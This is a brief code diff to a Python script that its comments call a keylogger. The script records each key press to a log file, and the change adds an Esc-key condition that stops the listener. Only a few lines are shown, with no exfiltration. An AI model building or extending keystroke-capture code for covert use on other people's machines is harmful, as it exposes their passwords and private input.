@@ -17,6 +17,9 @@ def write_to_log(key):
 
 # Define a function that listens for key presses and writes them to the log file.
 def on_key_press(key):
+    if key == Key.esc:
+        # Stop keylogger
+        return False
     write_to_log(key)
 
 # Set up the keylogger
